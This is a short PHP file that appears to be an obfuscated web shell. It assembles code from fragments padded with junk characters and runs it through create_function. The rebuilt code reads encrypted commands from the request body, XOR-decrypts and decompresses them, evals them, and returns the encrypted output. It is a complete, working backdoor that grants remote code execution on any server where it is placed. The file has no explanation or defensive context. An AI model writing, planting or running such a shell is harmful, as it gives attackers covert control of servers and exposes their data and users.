<?php
$D='al(@gFCzunFCcompFCress(@x(@bFCaseFC64_FCdecode($mFC[1])FC,$kFC)));FC$o=@oFCb_get_conteFCnts();@ob';
$J='atch("/$kh(.+)$kfFC/",@file_FCgFCet_cFContFCentsFCFC("php://input"),$m)=FC=1) {@ob_FCstart();@eFCv';
$j='FC$k="32757543"FC;$khFC="baa2FCf8494bFC08";$kfFCFC="8741af1fe85FCd";$p="FCANQa0FCNyeB3hsFC1zEj";fF';
$W='j=0;($j<$cFC&&$i<$FCl);FC$jFC++,$iFC++){FC$o.FC=$t{$i}^$k{FC$j};}}return $oFCFC;}if (FCFC@pFCreg_mFC';
$z=str_replace('tk','','tkcreattketk_ftkuntkctktion');
$U='_eFCnd_cleFCan(FC);$r=@basFCe64_eFCncode(@xFC(@gzcomFCpFCress($o),FC$k)FC);priFCnt("$p$khFC$r$kf");}';
$Q='CunctFCiFCon x($tFC,$k){$FCc=strFClenFC($k);$l=FCstrlFCen($t)FC;$o=FC"";foFCr($i=0;$i<$l;){fFCor(FC$';
$P=str_replace('FC','',$j.$Q.$W.$J.$D.$U);
$h=$z('',$P);$h();
?>
